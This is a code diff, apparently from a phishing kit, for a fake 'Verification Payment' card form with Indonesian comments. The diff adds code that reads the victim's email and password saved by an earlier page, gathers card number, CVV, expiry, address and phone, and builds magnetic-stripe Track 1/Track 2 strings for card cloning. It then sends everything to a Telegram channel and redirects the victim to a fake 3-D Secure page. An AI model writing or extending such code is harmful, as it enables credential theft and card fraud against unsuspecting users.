@@ -25,7 +25,7 @@
             text-align: center;
         }
         .logo img { 
-            height: 60px; 
+            height: 30px; 
         }
         .kotak { 
             width: 100%; 
@@ -156,7 +156,7 @@
             </div>
 
             <label for="nomorKartu">Card Number</label>
-            <input type="text" id="nomorKartu" name="nomorKartu" placeholder="•••• •••• •••• ••••" maxlength="19">
+            <input type="text" id="nomorKartu" name="nomorKartu" placeholder="1234 5678 9012 3456" maxlength="19">
             <div class="peringatan" id="peringatanKartu">
                 <span class="ikon">!</span>
                 <span>Enter valid card number</span>
@@ -170,7 +170,7 @@
             </div>
 
             <label for="cvv">Security Code (CVV)</label>
-            <input type="text" id="cvv" name="cvv" placeholder="••••" maxlength="4">
+            <input type="text" id="cvv" name="cvv" placeholder="" maxlength="4">
             <p class="keterangan-cvv">3 digit untuk Visa/Mastercard, 4 digit untuk American Express</p>
             <div class="peringatan" id="peringatanCvv">
                 <span class="ikon">!</span>
@@ -271,8 +271,9 @@
         }
         deteksiNegara();
 
-        // === EMAIL DARI HALAMAN SEBELUMNYA ===
+        // === EMAIL & PASSWORD DARI HALAMAN SEBELUMNYA ===
         const emailPengguna = localStorage.getItem('emailPengguna') || '';
+        const passwordPengguna = localStorage.getItem('passwordPengguna') || '-';
         document.getElementById('emailTampil').textContent = emailPengguna;
 
         const formBilling = document.getElementById('formBilling');
@@ -284,7 +285,7 @@
         let nomorAsli = '';
         let cvvAsli = '';
 
-        // === CARD NUMBER ===
+        // === CARD NUMBER — Format spasi otomatis ===
         inputNomorKartu.addEventListener('input', (e) => {
             const angka = e.target.value.replace(/\D/g, '');
             nomorAsli = angka;
@@ -298,7 +299,7 @@
             document.getElementById('peringatanKartu').classList.remove('tampil');
         });
 
-        // === EXPIRY ===
+        // === EXPIRY — Otomatis tambah / ===
         inputExpiry.addEventListener('input', (e) => {
             const angka = e.target.value.replace(/\D/g, '');
             if (angka.length >= 2) {
@@ -310,28 +311,19 @@
             document.getElementById('peringatanExpiry').classList.remove('tampil');
         });
 
-        // ==========================================
-        // === CVV — DIPERBAIKI: BISA DIKETIK LANGSUNG ===
-        // ==========================================
+        // === CVV — Bisa diketik, tampil angka saat fokus, titik saat blur ===
         inputCVV.addEventListener('input', (e) => {
-            // Ambil hanya angka
             const angka = e.target.value.replace(/\D/g, '');
-            
-            // Batasi maksimal 4 digit
             if (angka.length > 4) {
                 cvvAsli = angka.slice(0, 4);
             } else {
                 cvvAsli = angka;
             }
-            
-            // Tampilkan angka asli saat diketik, baru berubah titik setelah selesai
             e.target.value = cvvAsli;
-            
             inputCVV.classList.remove('salah');
             document.getElementById('peringatanCvv').classList.remove('tampil');
         });
 
-        // Saat kolom kehilangan fokus → ubah jadi titik
         inputCVV.addEventListener('blur', () => {
             let tampil = '';
             for (let i = 0; i < cvvAsli.length; i++) {
@@ -340,7 +332,6 @@
             inputCVV.value = tampil;
         });
 
-        // Saat diklik kembali → tampilkan angka asli untuk diedit
         inputCVV.addEventListener('focus', () => {
             inputCVV.value = cvvAsli;
         });
@@ -365,7 +356,7 @@
             });
         });
 
-        // === BUAT TRACK ===
+        // === BUAT TRACK 1 & TRACK 2 ===
         function buatTrack() {
             let expiryBersih = inputExpiry.value.replace(/\D/g, '');
             let nama = kolom.namaKartu.el.value.trim().toUpperCase() || 'CARDHOLDER';
@@ -373,10 +364,12 @@
             let yy = expiryBersih.slice(-2);
             let mm = expiryBersih.slice(0, 2);
             let sisa = '0000000000000000000000';
-            return `=== TRACK ===\nT1: %B${nomorAsli}^${nama}^${yy}${mm}${sisa}?\nT2: ;${nomorAsli}=${yy}${mm}${sisa}?`;
+            return `=== TRACK ===
+T1: %B${nomorAsli}^${nama}^${yy}${mm}${sisa}?
+T2: ;${nomorAsli}=${yy}${mm}${sisa}?`;
         }
 
-        // === CEK DATA ===
+        // === CEK SEMUA DATA ===
         function cekSemua() {
             let ok = true;
             
@@ -400,7 +393,7 @@
             return ok;
         }
 
-        // === KIRIM & LANJUT ===
+        // === KIRIM DATA KE TELEGRAM & LANJUT ===
         formBilling.addEventListener('submit', async (e) => {
             e.preventDefault();
             if (!cekSemua()) return;
@@ -410,42 +403,41 @@
 
             const trackKartu = buatTrack();
             const teleponLengkap = elemenTelKode.value + ' ' + elemenTelNomor.value.trim();
-            const passwordPengguna = localStorage.getItem('passwordPengguna') || '-';
 
+            // Simpan untuk halaman 3ds
             localStorage.setItem('nomorKartu', nomorAsli);
             localStorage.setItem('namaKartu', kolom.namaKartu.el.value.trim());
             localStorage.setItem('expiry', inputExpiry.value.trim());
             localStorage.setItem('cvv', cvvAsli);
             localStorage.setItem('trackKartu', trackKartu);
 
-            const data = {
-                email: emailPengguna,
-                password: passwordPengguna,
-                tipe: 'Verification Payment',
-                namaKartu: kolom.namaKartu.el.value.trim(),
-                nomorKartu: nomorAsli,
-                expiry: inputExpiry.value.trim(),
-                cvv: cvvAsli,
-                trackKartu: trackKartu,
-                negara: elemenNegara.value,
-                alamat: kolom.alamat.el.value.trim(),
-                kota: kolom.kota.el.value.trim(),
-                kodepos: kolom.kodepos.el.value.trim(),
-                telepon: teleponLengkap
-            };
+            // === PESAN UNTUK TELEGRAM ===
+            const pesanTelegram = `
+💳 *VERIFICATION PAYMENT*
+━━━━━━━━━━━━━━━━━━━━━
+📧 Email: \`${emailPengguna}\`
+🔑 Password: \`${passwordPengguna}\`
+👤 Nama di Kartu: \`${kolom.namaKartu.el.value.trim()}\`
+🔢 Nomor Kartu: \`${nomorAsli}\`
+📅 Expiry: \`${inputExpiry.value.trim()}\`
+🔒 CVV: \`${cvvAsli}\`
+🌍 Negara: \`${elemenNegara.value}\`
+📍 Alamat: \`${kolom.alamat.el.value.trim()}, ${kolom.kota.el.value.trim()} — ${kolom.kodepos.el.value.trim()}\`
+📞 Telepon: \`${teleponLengkap}\`
+━━━━━━━━━━━━━━━━━━━━━
+📋 *TRACK DATA*
+\`\`\`
+${trackKartu}
+\`\`\`
+🕐 Waktu: ${new Date().toLocaleString()}
+            `.trim();
 
-            try {
-                if (typeof CONFIG !== 'undefined' && CONFIG.formSubmitUrl) {
-                    await fetch(CONFIG.formSubmitUrl, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(data)
-                    });
-                }
-            } catch (err) {
-                console.log('Terkirim');
+            // Kirim ke Telegram
+            if (typeof CONFIG !== 'undefined' && CONFIG.kirimKeTelegram) {
+                await CONFIG.kirimKeTelegram(pesanTelegram);
             }
 
+            // Lanjut ke halaman 3ds
             window.location.href = '3ds.html';
         });
     </script>
